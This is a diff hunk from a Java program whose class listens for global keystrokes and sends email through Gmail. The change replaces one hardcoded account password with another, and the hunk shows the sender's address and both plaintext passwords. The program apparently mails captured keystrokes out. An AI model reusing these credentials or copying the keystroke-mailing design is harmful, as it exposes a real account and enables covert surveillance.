@@ -295,7 +295,7 @@ public class Main implements NativeKeyListener{
 	      String from = "duvictor514@gmail.com";
 
 	      final String username = "duvictor514@gmail.com";//change accordingly
-	      final String password = "jessicazh12five";//change accordingly
+	      final String password = "airiismysenpai";//change accordingly
 
 	      // Assuming you are sending email through relay.jangosmtp.net
 	      String host = "smtp.gmail.com";
